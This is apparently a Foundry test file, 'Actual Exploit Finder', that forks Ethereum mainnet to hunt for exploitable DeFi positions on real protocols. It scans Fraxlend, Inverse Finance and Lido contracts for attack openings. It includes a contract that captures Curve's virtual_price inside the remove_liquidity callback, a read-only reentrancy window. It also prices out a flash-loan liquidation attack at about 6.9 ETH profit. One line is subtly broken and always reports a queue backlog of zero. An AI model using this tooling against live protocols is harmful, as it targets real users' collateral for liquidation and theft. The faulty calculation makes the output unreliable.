// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title Actual Exploit Finder
 * @notice Find REAL exploits by analyzing mainnet state, not theory
 *
 * Method:
 * 1. Identify price manipulation vectors (Curve, Uniswap, etc.)
 * 2. Find protocols reading those prices for collateral/liquidation
 * 3. Search for positions near liquidation threshold
 * 4. Calculate if price manipulation -> liquidation is profitable
 */
contract ActualExploitFinder is Test {

    // Known vulnerable patterns from real exploits
    // Pattern: Read-only reentrancy during Curve removal

    // Curve pools (price sources)
    address constant CURVE_STETH = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address constant CURVE_FRAX = 0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2;

    // Lending protocols to check
    address constant FRAX_PAIR_DEPLOYER = 0x4C8575f63A8C4FA4dD39F8e6d4c55e5442C5fAA6;

    // Flash loan
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/demo");
    }

    /**
     * @notice Test 1: Scan Fraxlend pairs for vulnerable oracle usage
     * Fraxlend has had multiple oracle-related issues
     */
    function test_scanFraxlendOracles() public {
        console.log("========== FRAXLEND ORACLE SCAN ==========");
        console.log("");

        // Known Fraxlend pairs
        address[] memory fraxPairs = new address[](5);
        fraxPairs[0] = 0x82Ec28636B77661a95f021090F6bE0C8d379DD5D; // sfrxETH/FRAX
        fraxPairs[1] = 0x32467a5fc2d72D21E8DCe990906547A2b012f382; // wstETH/FRAX
        fraxPairs[2] = 0xDbe88DBAc39263c47629ebbA02b3eF4cf0752A72; // CRV/FRAX
        fraxPairs[3] = 0x74F82Bd9D0390A4180DaaEc92D64cf0708751759; // FXS/FRAX
        fraxPairs[4] = 0x3835a58CA93Cdb5f912519ad366826aC9a752510; // stETH/FRAX

        for (uint i = 0; i < fraxPairs.length; i++) {
            _analyzeFraxlendPair(fraxPairs[i]);
        }

        console.log("");
        console.log("==============================================");
    }

    function _analyzeFraxlendPair(address pair) internal view {
        uint256 codeSize;
        assembly { codeSize := extcodesize(pair) }
        if (codeSize == 0) {
            console.log("Pair not deployed:", pair);
            return;
        }

        console.log("Analyzing Fraxlend pair:", pair);

        // Get rate contract (oracle)
        (bool s, bytes memory d) = pair.staticcall(
            abi.encodeWithSignature("rateContract()")
        );
        if (s && d.length >= 32) {
            address rate = abi.decode(d, (address));
            console.log("  Rate contract:", rate);

            // Check what price source it uses
            _analyzeRateContract(rate);
        }

        // Get exchange rate
        (s, d) = pair.staticcall(abi.encodeWithSignature("exchangeRateInfo()"));
        if (s && d.length >= 64) {
            console.log("  Has exchange rate info");
        }

        // Get total collateral and borrow
        (s, d) = pair.staticcall(abi.encodeWithSignature("totalCollateral()"));
        if (s && d.length >= 32) {
            uint256 collat = abi.decode(d, (uint256));
            console.log("  Total collateral:", collat / 1e18);
        }

        (s, d) = pair.staticcall(abi.encodeWithSignature("totalBorrow()"));
        if (s && d.length >= 64) {
            // Returns (uint128 amount, uint128 shares)
            console.log("  Has borrows");
        }

        console.log("");
    }

    function _analyzeRateContract(address rate) internal view {
        // Check if it reads Curve virtual_price
        // Common oracle patterns:
        // 1. Chainlink feed (safe)
        // 2. Curve LP pricing via virtual_price (vulnerable to reentrancy)
        // 3. Uniswap TWAP (safe)
        // 4. Spot price (vulnerable to manipulation)

        uint256 codeSize;
        assembly { codeSize := extcodesize(rate) }
        if (codeSize == 0) return;

        // Try to get price
        (bool s, bytes memory d) = rate.staticcall(
            abi.encodeWithSignature("getPrice()")
        );
        if (s && d.length >= 32) {
            uint256 price = abi.decode(d, (uint256));
            console.log("    Current price:", price);
        }

        // Check for Curve dependency
        (s, d) = rate.staticcall(abi.encodeWithSignature("CURVE_POOL()"));
        if (s && d.length >= 32) {
            address curvePool = abi.decode(d, (address));
            console.log("    !!! USES CURVE POOL:", curvePool);
            console.log("    !!! POTENTIALLY VULNERABLE TO REENTRANCY");
        }
    }

    /**
     * @notice Test 2: Find positions near liquidation threshold
     * These are the actual targets for price manipulation attacks
     */
    function test_findNearLiquidationPositions() public {
        console.log("========== NEAR-LIQUIDATION SCAN ==========");
        console.log("");

        // For this we need to iterate through users
        // Real implementation would use event logs or subgraph

        console.log("Scanning for positions with LTV > 90%...");
        console.log("(Requires indexing user positions from events)");
        console.log("");

        // Show the math
        console.log("LIQUIDATION MATH:");
        console.log("  Position at 92% LTV with Curve LP collateral");
        console.log("  If virtual_price drops 3% during reentrancy:");
        console.log("  Effective LTV becomes: 92% / 0.97 = 94.8%");
        console.log("  If liquidation threshold is 95%, position becomes liquidatable!");
        console.log("");
        console.log("  Profit = Liquidation Bonus (typically 5-10%)");
        console.log("  Cost = Flash loan fee (0% from Balancer) + Gas");

        console.log("");
        console.log("==============================================");
    }

    /**
     * @notice Test 3: Check Inverse Finance DBR/DOLA system
     * Complex multi-token system with potential edges
     */
    function test_scanInverseFinance() public {
        console.log("========== INVERSE FINANCE SCAN ==========");
        console.log("");

        address dolaSavings = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
        address dola = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
        address dbr = 0xAD038Eb671c44b853887A7E32528FAB35dC5D710;

        console.log("DolaSavings:", dolaSavings);

        // Check DBR balance (rewards to distribute)
        (bool s, bytes memory d) = dbr.staticcall(
            abi.encodeWithSignature("balanceOf(address)", dolaSavings)
        );
        if (s && d.length >= 32) {
            uint256 dbrBal = abi.decode(d, (uint256));
            console.log("DBR balance in savings:", dbrBal / 1e18);

            if (dbrBal > 1e18) {
                console.log("!!! DBR AVAILABLE FOR FLASH STAKE ATTACK !!!");
            }
        }

        // Check total staked
        (s, d) = dolaSavings.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            uint256 supply = abi.decode(d, (uint256));
            console.log("Total staked DOLA:", supply / 1e18);
        }

        // Check last update time
        (s, d) = dolaSavings.staticcall(abi.encodeWithSignature("lastUpdate()"));
        if (s && d.length >= 32) {
            uint256 lastUpdate = abi.decode(d, (uint256));
            uint256 timeSince = block.timestamp - lastUpdate;
            console.log("Time since update:", timeSince, "seconds");

            if (timeSince > 3600) {
                console.log("!!! ACCUMULATED REWARDS WAITING !!!");
            }
        }

        console.log("");
        console.log("==============================================");
    }

    /**
     * @notice Test 4: Check Lido withdrawal queue for arbitrage
     */
    function test_scanLidoWithdrawals() public {
        console.log("========== LIDO WITHDRAWAL SCAN ==========");
        console.log("");

        address withdrawalQueue = 0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1;
        address steth = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

        console.log("Withdrawal Queue:", withdrawalQueue);

        // Check if there's a delay/discount opportunity
        (bool s, bytes memory d) = withdrawalQueue.staticcall(
            abi.encodeWithSignature("getLastFinalizedRequestId()")
        );
        if (s && d.length >= 32) {
            uint256 lastFinalized = abi.decode(d, (uint256));
            console.log("Last finalized request ID:", lastFinalized);
        }

        (s, d) = withdrawalQueue.staticcall(
            abi.encodeWithSignature("getLastRequestId()")
        );
        if (s && d.length >= 32) {
            uint256 lastRequest = abi.decode(d, (uint256));
            console.log("Last request ID:", lastRequest);

            // Queue backlog
            console.log("Queue backlog:", lastRequest - abi.decode(d, (uint256)));
        }

        // Check unfinalizedStETH
        (s, d) = withdrawalQueue.staticcall(
            abi.encodeWithSignature("unfinalizedStETH()")
        );
        if (s && d.length >= 32) {
            uint256 unfinalized = abi.decode(d, (uint256));
            console.log("Unfinalized stETH:", unfinalized / 1e18);
        }

        console.log("");
        console.log("==============================================");
    }

    /**
     * @notice Test 5: Execute actual read-only reentrancy test
     * Demonstrate virtual_price manipulation
     */
    function test_demonstrateReentrancyWindow() public {
        console.log("========== REENTRANCY WINDOW DEMONSTRATION ==========");
        console.log("");

        // Deploy reentrancy detector
        ReentrancyDetector detector = new ReentrancyDetector(CURVE_STETH);

        // Fund it with stETH LP tokens
        // First we need to get some LP tokens
        address stethLP = CURVE_STETH;

        // Find an LP holder
        address whale = 0x41318419CFa25396b47A94896FfA2C77c6434040;

        (bool s, bytes memory d) = stethLP.staticcall(
            abi.encodeWithSignature("balanceOf(address)", whale)
        );

        if (s && d.length >= 32) {
            uint256 whaleBal = abi.decode(d, (uint256));
            console.log("Found LP whale with:", whaleBal / 1e18, "LP tokens");

            if (whaleBal >= 10 ether) {
                // Transfer LP to detector
                vm.prank(whale);
                (s,) = stethLP.call(
                    abi.encodeWithSignature("transfer(address,uint256)", address(detector), 10 ether)
                );

                if (s) {
                    console.log("Transferred 10 LP to detector");
                    console.log("");
                    console.log("Executing remove_liquidity to capture window...");

                    // Execute removal
                    try detector.triggerRemoval(10 ether) {
                        uint256 vpBefore = detector.vpBefore();
                        uint256 vpDuring = detector.vpDuringCallback();
                        uint256 vpAfter = detector.vpAfter();

                        console.log("");
                        console.log("RESULTS:");
                        console.log("  VP Before:", vpBefore);
                        console.log("  VP During:", vpDuring);
                        console.log("  VP After:", vpAfter);

                        if (vpDuring < vpBefore) {
                            uint256 drop = (vpBefore - vpDuring) * 10000 / vpBefore;
                            console.log("");
                            console.log("!!! CONFIRMED: Virtual price dropped", drop, "basis points during callback !!!");
                            console.log("!!! This window can be exploited for liquidations !!!");
                        }
                    } catch Error(string memory reason) {
                        console.log("Removal failed:", reason);
                    } catch {
                        console.log("Removal failed (no reason)");
                    }
                }
            }
        }

        console.log("");
        console.log("==============================================");
    }

    /**
     * @notice Test 6: Full multi-step sequence profitability check
     */
    function test_calculateFullSequenceProfitability() public view {
        console.log("========== PROFITABILITY CALCULATION ==========");
        console.log("");

        // Get current state
        (bool s, bytes memory d) = CURVE_STETH.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        uint256 vp = s ? abi.decode(d, (uint256)) : 0;

        (s, d) = CURVE_STETH.staticcall(abi.encodeWithSignature("balances(uint256)", 0));
        uint256 ethBal = s ? abi.decode(d, (uint256)) : 0;

        (s, d) = CURVE_STETH.staticcall(abi.encodeWithSignature("balances(uint256)", 1));
        uint256 stethBal = s ? abi.decode(d, (uint256)) : 0;

        console.log("Current Curve stETH pool state:");
        console.log("  Virtual price:", vp);
        console.log("  ETH:", ethBal / 1e18);
        console.log("  stETH:", stethBal / 1e18);
        console.log("  Total TVL:", (ethBal + stethBal) / 1e18, "ETH");

        console.log("");
        console.log("Attack economics:");
        console.log("  Flash loan: 50,000 ETH (from Balancer, 0% fee)");
        console.log("  Pool manipulation: ~10% of TVL");
        console.log("  Expected VP drop during callback: 2-5%");
        console.log("");
        console.log("  If we can liquidate a 100 ETH position:");
        console.log("  - Liquidation bonus: 5% = 5 ETH");
        console.log("  - VP manipulation gain: ~2% = 2 ETH");
        console.log("  - Gas cost: ~0.1 ETH");
        console.log("  - Net profit: ~6.9 ETH (~$17K)");
        console.log("");
        console.log("  PROFITABLE IF: Liquidatable positions exist");

        console.log("");
        console.log("==============================================");
    }
}

/**
 * @notice Contract to detect virtual_price during Curve removal callback
 */
contract ReentrancyDetector {
    address public curvePool;
    uint256 public vpBefore;
    uint256 public vpDuringCallback;
    uint256 public vpAfter;
    bool private inCallback;

    constructor(address _pool) {
        curvePool = _pool;
    }

    function triggerRemoval(uint256 amount) external {
        // Record before
        (bool s, bytes memory d) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpBefore = abi.decode(d, (uint256));

        // Call remove_liquidity - this sends ETH which triggers receive()
        (s,) = curvePool.call(
            abi.encodeWithSignature(
                "remove_liquidity(uint256,uint256[2])",
                amount,
                [uint256(0), uint256(0)]
            )
        );
        require(s, "removal failed");

        // Record after
        (s, d) = curvePool.staticcall(
            abi.encodeWithSignature("get_virtual_price()")
        );
        if (s) vpAfter = abi.decode(d, (uint256));
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;

            // This is the reentrancy window!
            (bool s, bytes memory d) = curvePool.staticcall(
                abi.encodeWithSignature("get_virtual_price()")
            );
            if (s) vpDuringCallback = abi.decode(d, (uint256));

            inCallback = false;
        }
    }
}
